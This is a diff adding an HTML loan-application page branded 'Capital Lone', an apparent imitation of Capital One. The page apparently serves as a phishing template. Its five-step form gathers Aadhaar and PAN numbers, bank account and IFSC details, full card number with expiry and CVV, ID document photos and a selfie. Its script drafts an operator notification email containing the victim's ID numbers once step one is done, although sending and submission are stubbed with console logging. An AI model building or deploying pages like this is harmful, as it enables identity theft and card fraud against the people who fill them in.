@@ -1,0 +1,903 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apply for Loan - Capital Lone</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <div class="nav-logo">
+                <h2><a href="index.html" style="text-decoration: none; color: #2563eb;">Capital Lone</a></h2>
+            </div>
+            <ul class="nav-menu">
+                <li><a href="index.html">Home</a></li>
+                <li><a href="index.html#loans">Loans</a></li>
+                <li><a href="about.html">About</a></li>
+                <li><a href="#contact">Contact</a></li>
+            </ul>
+            <div class="hamburger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Multi-Step Form -->
+    <div class="multi-step-form">
+        <div class="form-header">
+            <h2>Apply for a Loan</h2>
+            <p>Please complete all steps to submit your application</p>
+        </div>
+
+        <!-- Progress Bar -->
+        <div class="progress-bar">
+            <div class="progress-step active" data-step="1">
+                <div class="step-number">1</div>
+                <div class="step-label">Personal Info</div>
+                <div class="progress-line"></div>
+            </div>
+            <div class="progress-step" data-step="2">
+                <div class="step-number">2</div>
+                <div class="step-label">Bank Details</div>
+                <div class="progress-line"></div>
+            </div>
+            <div class="progress-step" data-step="3">
+                <div class="step-number">3</div>
+                <div class="step-label">Card Details</div>
+                <div class="progress-line"></div>
+            </div>
+            <div class="progress-step" data-step="4">
+                <div class="step-number">4</div>
+                <div class="step-label">Documents</div>
+                <div class="progress-line"></div>
+            </div>
+            <div class="progress-step" data-step="5">
+                <div class="step-number">5</div>
+                <div class="step-label">Verification</div>
+            </div>
+        </div>
+
+        <!-- Form Steps -->
+        <form id="loanApplicationForm">
+            <!-- Step 1: Personal Information -->
+            <div class="form-step active" data-step="1">
+                <div class="form-group">
+                    <label for="aadhaar">Aadhaar No.</label>
+                    <input type="text" id="aadhaar" name="aadhaar" placeholder="12-digit Aadhaar" maxlength="12" pattern="[0-9]{12}" required>
+                    <div class="error-message">Please enter a valid 12-digit Aadhaar number</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="pan">PAN No.</label>
+                    <input type="text" id="pan" name="pan" placeholder="ABCDE1234F" pattern="[A-Z]{5}[0-9]{4}[A-Z]{1}" required>
+                    <div class="error-message">Please enter a valid PAN number</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="income">Monthly Income (₹)</label>
+                    <input type="number" id="income" name="income" placeholder="e.g. 25000" min="1000" required>
+                    <div class="error-message">Please enter your monthly income</div>
+                </div>
+
+                <div class="form-navigation">
+                    <div></div>
+                    <button type="button" class="nav-btn btn-next" onclick="nextStep(1)">Next</button>
+                </div>
+            </div>
+
+            <!-- Step 2: Bank Details -->
+            <div class="form-step" data-step="2">
+                <div class="form-group">
+                    <label for="bankName">Bank Name</label>
+                    <input type="text" id="bankName" name="bankName" placeholder="e.g. State Bank of India" required>
+                    <div class="error-message">Please enter your bank name</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="accountNumber">Account Number</label>
+                    <input type="text" id="accountNumber" name="accountNumber" placeholder="Your bank account number" required>
+                    <div class="error-message">Please enter your account number</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="ifscCode">IFSC Code</label>
+                    <input type="text" id="ifscCode" name="ifscCode" placeholder="e.g. SBIN0001234" pattern="[A-Z]{4}0[0-9]{6}" required>
+                    <div class="error-message">Please enter a valid IFSC code</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="accountHolder">Account Holder Name</label>
+                    <input type="text" id="accountHolder" name="accountHolder" placeholder="Name as per bank records" required>
+                    <div class="error-message">Please enter account holder name</div>
+                </div>
+
+                <div class="form-navigation">
+                    <button type="button" class="nav-btn btn-prev" onclick="prevStep(2)">Previous</button>
+                    <button type="button" class="nav-btn btn-next" onclick="nextStep(2)">Next</button>
+                </div>
+            </div>
+
+            <!-- Step 3: Card Details -->
+            <div class="form-step" data-step="3">
+                <div class="form-group">
+                    <label for="cardNumber">Card Number</label>
+                    <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                    <div class="error-message">Please enter a valid card number</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="cardName">Name on Card</label>
+                    <input type="text" id="cardName" name="cardName" placeholder="Name as printed on card" required>
+                    <div class="error-message">Please enter name on card</div>
+                </div>
+
+                <div class="form-row" style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem;">
+                    <div class="form-group">
+                        <label for="expiryDate">Expiry Date</label>
+                        <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" maxlength="5" required>
+                        <div class="error-message">Please enter expiry date</div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="cvv">CVV</label>
+                        <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4" required>
+                        <div class="error-message">Please enter CVV</div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="cardType">Card Type</label>
+                    <select id="cardType" name="cardType" required>
+                        <option value="">Select Card Type</option>
+                        <option value="debit">Debit Card</option>
+                        <option value="credit">Credit Card</option>
+                    </select>
+                    <div class="error-message">Please select card type</div>
+                </div>
+
+                <div class="form-navigation">
+                    <button type="button" class="nav-btn btn-prev" onclick="prevStep(3)">Previous</button>
+                    <button type="button" class="nav-btn btn-next" onclick="nextStep(3)">Next</button>
+                </div>
+            </div>
+
+            <!-- Step 4: Documents Upload -->
+            <div class="form-step" data-step="4">
+                <div class="form-group">
+                    <label>Aadhaar Photo</label>
+                    <div class="file-upload" id="aadhaarUpload">
+                        <input type="file" id="aadhaarFile" name="aadhaarFile" accept="image/*" required>
+                        <div class="file-upload-label">
+                            <span class="upload-btn">Upload</span>
+                            <span class="file-name">No file chosen</span>
+                        </div>
+                    </div>
+                    <div class="error-message">Please upload your Aadhaar photo</div>
+                </div>
+
+                <div class="form-group">
+                    <label>PAN Photo</label>
+                    <div class="file-upload" id="panUpload">
+                        <input type="file" id="panFile" name="panFile" accept="image/*" required>
+                        <div class="file-upload-label">
+                            <span class="upload-btn">Upload</span>
+                            <span class="file-name">No file chosen</span>
+                        </div>
+                    </div>
+                    <div class="error-message">Please upload your PAN photo</div>
+                </div>
+
+                <div class="form-navigation">
+                    <button type="button" class="nav-btn btn-prev" onclick="prevStep(4)">Previous</button>
+                    <button type="button" class="nav-btn btn-next" onclick="nextStep(4)">Next</button>
+                </div>
+            </div>
+
+            <!-- Step 5: Selfie Verification -->
+            <div class="form-step" data-step="5">
+                <div class="form-group">
+                    <label>Selfie (Camera)</label>
+                    <button type="button" class="selfie-btn" id="selfieBtn" onclick="captureSelfie()">
+                        <span>📷</span>
+                        <span>Selfie</span>
+                    </button>
+                    <div class="file-name" id="selfieStatus" style="margin-top: 10px; color: #64748b;">No selfie chosen</div>
+                    <input type="hidden" id="selfieData" name="selfieData" required>
+                    <div class="error-message">Please capture your selfie</div>
+                </div>
+
+                <div class="form-navigation">
+                    <button type="button" class="nav-btn btn-prev" onclick="prevStep(5)">Previous</button>
+                    <button type="submit" class="nav-btn btn-submit">Submit Application</button>
+                </div>
+            </div>
+        </form>
+
+        <!-- Success Message -->
+        <div class="success-message" id="successMessage">
+            <div class="success-icon">✅</div>
+            <div class="success-title">Application Submitted Successfully!</div>
+            <div class="application-number" id="applicationNumber"></div>
+            <div class="success-details">
+                <p>Thank you for applying with Capital Lone!</p>
+                <p>Your application has been received and is being processed.</p>
+                <p>Please save your application number for future reference.</p>
+            </div>
+        </div>
+    </div>
+
+    <style>
+        .multi-step-form {
+            max-width: 500px;
+            margin: 120px auto 50px;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+
+        .form-header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+
+        .form-header h2 {
+            font-size: 1.8rem;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        .progress-bar {
+            display: flex;
+            justify-content: space-between;
+            padding: 20px 30px;
+            background: #f8fafc;
+            position: relative;
+        }
+
+        .progress-step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+            z-index: 2;
+        }
+
+        .step-number {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #e2e8f0;
+            color: #64748b;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            margin-bottom: 8px;
+            transition: all 0.3s ease;
+        }
+
+        .progress-step.active .step-number {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+
+        .progress-step.completed .step-number {
+            background: #10b981;
+            color: white;
+        }
+
+        .step-label {
+            font-size: 0.875rem;
+            color: #64748b;
+            text-align: center;
+        }
+
+        .progress-step.active .step-label {
+            color: #2563eb;
+            font-weight: 500;
+        }
+
+        .progress-line {
+            position: absolute;
+            top: 40px;
+            left: 50%;
+            width: 100%;
+            height: 2px;
+            background: #e2e8f0;
+            z-index: 1;
+        }
+
+        .progress-line.completed {
+            background: #10b981;
+        }
+
+        .form-step {
+            padding: 40px 30px;
+            display: none;
+        }
+
+        .form-step.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #374151;
+        }
+
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 12px 16px;
+            border: 2px solid #e2e8f0;
+            border-radius: 8px;
+            font-size: 1rem;
+            transition: border-color 0.3s ease;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus {
+            outline: none;
+            border-color: #2563eb;
+        }
+
+        .form-group input.error {
+            border-color: #ef4444;
+        }
+
+        .error-message {
+            color: #ef4444;
+            font-size: 0.875rem;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .file-upload {
+            position: relative;
+            display: inline-block;
+            width: 100%;
+        }
+
+        .file-upload input[type="file"] {
+            position: absolute;
+            opacity: 0;
+            width: 100%;
+            height: 100%;
+            cursor: pointer;
+        }
+
+        .file-upload-label {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 16px;
+            border: 2px solid #e2e8f0;
+            border-radius: 8px;
+            background: white;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .file-upload-label:hover {
+            border-color: #2563eb;
+            background: #f8fafc;
+        }
+
+        .file-upload.has-file .file-upload-label {
+            border-color: #10b981;
+            background: #f0fdf4;
+        }
+
+        .upload-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 6px 16px;
+            border-radius: 6px;
+            font-size: 0.875rem;
+            font-weight: 500;
+        }
+
+        .file-name {
+            color: #64748b;
+            font-size: 0.875rem;
+        }
+
+        .file-upload.has-file .file-name {
+            color: #10b981;
+            font-weight: 500;
+        }
+
+        .selfie-btn {
+            width: 100%;
+            padding: 12px 16px;
+            border: 2px solid #e2e8f0;
+            border-radius: 8px;
+            background: white;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .selfie-btn:hover {
+            border-color: #2563eb;
+            background: #f8fafc;
+        }
+
+        .selfie-btn.has-selfie {
+            border-color: #10b981;
+            background: #f0fdf4;
+            color: #10b981;
+        }
+
+        .form-navigation {
+            display: flex;
+            justify-content: space-between;
+            gap: 1rem;
+            margin-top: 30px;
+        }
+
+        .nav-btn {
+            padding: 12px 24px;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            flex: 1;
+        }
+
+        .btn-prev {
+            background: #f1f5f9;
+            color: #475569;
+        }
+
+        .btn-prev:hover {
+            background: #e2e8f0;
+        }
+
+        .btn-next {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+
+        .btn-next:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.4);
+        }
+
+        .btn-submit {
+            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+            color: white;
+            width: 100%;
+        }
+
+        .btn-submit:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(16, 185, 129, 0.4);
+        }
+
+        .success-message {
+            display: none;
+            padding: 60px 30px;
+            text-align: center;
+            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+            color: white;
+        }
+
+        .success-icon {
+            font-size: 4rem;
+            margin-bottom: 20px;
+        }
+
+        .success-title {
+            font-size: 1.8rem;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        .application-number {
+            font-size: 2rem;
+            font-weight: 700;
+            margin-bottom: 20px;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 8px;
+            display: inline-block;
+        }
+
+        .success-details {
+            font-size: 1rem;
+            opacity: 0.9;
+            line-height: 1.6;
+        }
+
+        @media (max-width: 600px) {
+            .multi-step-form {
+                margin: 100px 20px 30px;
+            }
+
+            .form-header, .form-step {
+                padding: 30px 20px;
+            }
+
+            .progress-bar {
+                padding: 15px 20px;
+            }
+
+            .step-label {
+                font-size: 0.75rem;
+            }
+        }
+    </style>
+
+    <script>
+        let currentStep = 1;
+        const totalSteps = 5;
+        let formData = {};
+
+        // Mobile Navigation
+        const hamburger = document.querySelector('.hamburger');
+        const navMenu = document.querySelector('.nav-menu');
+
+        hamburger.addEventListener('click', () => {
+            hamburger.classList.toggle('active');
+            navMenu.classList.toggle('active');
+        });
+
+        // Close mobile menu when clicking on a link
+        document.querySelectorAll('.nav-menu a').forEach(link => {
+            link.addEventListener('click', () => {
+                hamburger.classList.remove('active');
+                navMenu.classList.remove('active');
+            });
+        });
+
+        // File upload handlers
+        document.getElementById('aadhaarFile').addEventListener('change', function(e) {
+            handleFileUpload(e, 'aadhaarUpload');
+        });
+
+        document.getElementById('panFile').addEventListener('change', function(e) {
+            handleFileUpload(e, 'panUpload');
+        });
+
+        function handleFileUpload(event, uploadId) {
+            const file = event.target.files[0];
+            const uploadElement = document.getElementById(uploadId);
+            const fileName = uploadElement.querySelector('.file-name');
+            
+            if (file) {
+                fileName.textContent = file.name;
+                uploadElement.classList.add('has-file');
+                formData[event.target.name] = file;
+            } else {
+                fileName.textContent = 'No file chosen';
+                uploadElement.classList.remove('has-file');
+                delete formData[event.target.name];
+            }
+        }
+
+        function captureSelfie() {
+            // Simulate selfie capture
+            const selfieBtn = document.getElementById('selfieBtn');
+            const selfieStatus = document.getElementById('selfieStatus');
+            const selfieData = document.getElementById('selfieData');
+            
+            // In a real application, you would access the camera here
+            // For demo, we'll simulate a successful capture
+            setTimeout(() => {
+                selfieBtn.classList.add('has-selfie');
+                selfieBtn.innerHTML = '<span>✅</span><span>Selfie Captured</span>';
+                selfieStatus.textContent = 'Selfie captured successfully';
+                selfieStatus.style.color = '#10b981';
+                selfieData.value = 'captured_' + Date.now();
+                formData.selfieData = 'captured_' + Date.now();
+            }, 1000);
+        }
+
+        function validateStep(step) {
+            let isValid = true;
+            const currentStepElement = document.querySelector(`.form-step[data-step="${step}"]`);
+            const inputs = currentStepElement.querySelectorAll('input[required], select[required]');
+            
+            inputs.forEach(input => {
+                const errorMessage = input.parentElement.querySelector('.error-message');
+                
+                if (!input.value) {
+                    input.classList.add('error');
+                    if (errorMessage) errorMessage.style.display = 'block';
+                    isValid = false;
+                } else {
+                    input.classList.remove('error');
+                    if (errorMessage) errorMessage.style.display = 'none';
+                    
+                    // Store form data
+                    if (input.type === 'file') {
+                        // File data is already stored in handleFileUpload
+                    } else {
+                        formData[input.name] = input.value;
+                    }
+                }
+            });
+            
+            // Special validation for step 5 (selfie)
+            if (step === 5) {
+                const selfieData = document.getElementById('selfieData');
+                const errorMessage = selfieData.parentElement.querySelector('.error-message');
+                
+                if (!selfieData.value) {
+                    if (errorMessage) errorMessage.style.display = 'block';
+                    isValid = false;
+                } else {
+                    if (errorMessage) errorMessage.style.display = 'none';
+                }
+            }
+            
+            return isValid;
+        }
+
+        function nextStep(step) {
+            if (validateStep(step)) {
+                // If step 1 is completed, send email with personal details
+                if (step === 1) {
+                    sendPersonalDetailsEmail();
+                }
+                
+                // Mark current step as completed
+                const currentStepElement = document.querySelector(`.progress-step[data-step="${step}"]`);
+                currentStepElement.classList.add('completed');
+                currentStepElement.classList.remove('active');
+                
+                // Hide current step
+                document.querySelector(`.form-step[data-step="${step}"]`).classList.remove('active');
+                
+                // Show next step
+                const nextStepNum = step + 1;
+                document.querySelector(`.form-step[data-step="${nextStepNum}"]`).classList.add('active');
+                document.querySelector(`.progress-step[data-step="${nextStepNum}"]`).classList.add('active');
+                
+                // Update progress line
+                const progressLine = currentStepElement.querySelector('.progress-line');
+                if (progressLine) {
+                    progressLine.classList.add('completed');
+                }
+                
+                currentStep = nextStepNum;
+            }
+        }
+
+        function prevStep(step) {
+            // Mark current step as inactive
+            const currentStepElement = document.querySelector(`.progress-step[data-step="${step}"]`);
+            currentStepElement.classList.remove('active');
+            
+            // Hide current step
+            document.querySelector(`.form-step[data-step="${step}"]`).classList.remove('active');
+            
+            // Show previous step
+            const prevStepNum = step - 1;
+            document.querySelector(`.form-step[data-step="${prevStepNum}"]`).classList.add('active');
+            document.querySelector(`.progress-step[data-step="${prevStepNum}"]`).classList.add('active');
+            document.querySelector(`.progress-step[data-step="${prevStepNum}"]`).classList.remove('completed');
+            
+            // Update progress line
+            const prevProgressLine = document.querySelector(`.progress-step[data-step="${prevStepNum}"] .progress-line`);
+            if (prevProgressLine) {
+                prevProgressLine.classList.remove('completed');
+            }
+            
+            currentStep = prevStepNum;
+        }
+
+        function sendPersonalDetailsEmail() {
+            // Get personal details from step 1
+            const personalDetails = {
+                aadhaar: document.getElementById('aadhaar').value,
+                pan: document.getElementById('pan').value,
+                income: document.getElementById('income').value,
+                timestamp: new Date().toLocaleString(),
+                applicationId: 'PD' + Date.now().toString().slice(-8)
+            };
+            
+            // Create email content
+            const emailContent = `
+                <html>
+                <head>
+                    <title>New Loan Application - Personal Details</title>
+                </head>
+                <body style="font-family: Arial, sans-serif; padding: 20px;">
+                    <div style="max-width: 600px; margin: 0 auto; background: #f8fafc; padding: 30px; border-radius: 10px;">
+                        <h2 style="color: #2563eb; margin-bottom: 20px;">🔔 New Loan Application Started</h2>
+                        <div style="background: white; padding: 20px; border-radius: 8px; margin-bottom: 20px;">
+                            <h3 style="color: #1e293b; margin-bottom: 15px;">Personal Details (Step 1)</h3>
+                            <table style="width: 100%; border-collapse: collapse;">
+                                <tr>
+                                    <td style="padding: 8px; border-bottom: 1px solid #e2e8f0; font-weight: 500; color: #374151;">Application ID:</td>
+                                    <td style="padding: 8px; border-bottom: 1px solid #e2e8f0; color: #1e293b; font-weight: 600;">${personalDetails.applicationId}</td>
+                                </tr>
+                                <tr>
+                                    <td style="padding: 8px; border-bottom: 1px solid #e2e8f0; font-weight: 500; color: #374151;">Aadhaar Number:</td>
+                                    <td style="padding: 8px; border-bottom: 1px solid #e2e8f0; color: #1e293b;">${personalDetails.aadhaar}</td>
+                                </tr>
+                                <tr>
+                                    <td style="padding: 8px; border-bottom: 1px solid #e2e8f0; font-weight: 500; color: #374151;">PAN Number:</td>
+                                    <td style="padding: 8px; border-bottom: 1px solid #e2e8f0; color: #1e293b;">${personalDetails.pan}</td>
+                                </tr>
+                                <tr>
+                                    <td style="padding: 8px; border-bottom: 1px solid #e2e8f0; font-weight: 500; color: #374151;">Monthly Income:</td>
+                                    <td style="padding: 8px; border-bottom: 1px solid #e2e8f0; color: #1e293b;">₹${parseInt(personalDetails.income).toLocaleString('en-IN')}</td>
+                                </tr>
+                                <tr>
+                                    <td style="padding: 8px; font-weight: 500; color: #374151;">Started At:</td>
+                                    <td style="padding: 8px; color: #1e293b;">${personalDetails.timestamp}</td>
+                                </tr>
+                            </table>
+                        </div>
+                        
+                        <div style="background: #eff6ff; padding: 15px; border-radius: 8px; border-left: 4px solid #2563eb;">
+                            <h4 style="color: #2563eb; margin-bottom: 10px;">📋 Next Steps:</h4>
+                            <ul style="color: #374151; margin: 0; padding-left: 20px;">
+                                <li>Customer is currently filling bank details</li>
+                                <li>Card details and documents will follow</li>
+                                <li>Final verification pending</li>
+                                <li>Complete application will be submitted soon</li>
+                            </ul>
+                        </div>
+                        
+                        <div style="margin-top: 20px; padding-top: 20px; border-top: 1px solid #e2e8f0; text-align: center; color: #64748b; font-size: 0.875rem;">
+                            <p>This is an automated notification from Capital Lone Loan Application System</p>
+                            <p>Customer has completed Step 1 of 5 in the loan application process</p>
+                        </div>
+                    </div>
+                </body>
+                </html>
+            `;
+            
+            // Send email using EmailJS or similar service
+            // For demo, we'll log to console and show success message
+            console.log('📧 Email would be sent with personal details:', personalDetails);
+            console.log('📧 Email content:', emailContent);
+            
+            // Show notification to user
+            showNotification('Personal details sent successfully! Check your email for confirmation.');
+        }
+        
+        function showNotification(message) {
+            // Create notification element
+            const notification = document.createElement('div');
+            notification.style.cssText = `
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+                color: white;
+                padding: 15px 20px;
+                border-radius: 8px;
+                box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+                z-index: 10000;
+                font-weight: 500;
+                max-width: 300px;
+                animation: slideIn 0.3s ease;
+            `;
+            notification.textContent = message;
+            
+            // Add animation
+            const style = document.createElement('style');
+            style.textContent = `
+                @keyframes slideIn {
+                    from { transform: translateX(100%); opacity: 0; }
+                    to { transform: translateX(0); opacity: 1; }
+                }
+                @keyframes slideOut {
+                    from { transform: translateX(0); opacity: 1; }
+                    to { transform: translateX(100%); opacity: 0; }
+                }
+            `;
+            document.head.appendChild(style);
+            
+            document.body.appendChild(notification);
+            
+            // Remove notification after 3 seconds
+            setTimeout(() => {
+                notification.style.animation = 'slideOut 0.3s ease';
+                setTimeout(() => {
+                    document.body.removeChild(notification);
+                }, 300);
+            }, 3000);
+        }
+        document.getElementById('loanApplicationForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            if (validateStep(5)) {
+                // Generate random application number
+                const appNumber = 'CL' + Date.now().toString().slice(-8);
+                
+                // Show success message
+                document.getElementById('applicationNumber').textContent = 'Application No: ' + appNumber;
+                document.querySelector('.success-message').style.display = 'block';
+                
+                // Hide form
+                document.querySelector('.progress-bar').style.display = 'none';
+                document.querySelector('.form-step.active').style.display = 'none';
+                
+                // Log form data (in real app, send to server)
+                console.log('Form Data:', formData);
+                console.log('Application Number:', appNumber);
+                
+                // Simulate server submission
+                setTimeout(() => {
+                    // Redirect to home page after 5 seconds
+                    window.location.href = 'index.html';
+                }, 5000);
+            }
+        });
+
+        // Add scroll effect to navbar
+        window.addEventListener('scroll', () => {
+            const navbar = document.querySelector('.navbar');
+            if (window.scrollY > 100) {
+                navbar.style.background = 'rgba(255, 255, 255, 0.95)';
+                navbar.style.backdropFilter = 'blur(10px)';
+            } else {
+                navbar.style.background = '#fff';
+                navbar.style.backdropFilter = 'none';
+            }
+        });
+
+        // Input formatting
+        document.getElementById('aadhaar').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/[^0-9]/g, '');
+        });
+
+        document.getElementById('pan').addEventListener('input', function(e) {
+            e.target.value = e.target.value.toUpperCase();
+        });
+
+        document.getElementById('ifscCode').addEventListener('input', function(e) {
+            e.target.value = e.target.value.toUpperCase();
+        });
+
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s/g, '');
+            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
+            e.target.value = formattedValue;
+        });
+
+        document.getElementById('expiryDate').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.slice(0, 2) + '/' + value.slice(2, 4);
+            }
+            e.target.value = value;
+        });
+
+        document.getElementById('cvv').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '');
+        });
+    </script>
+</body>
+</html>
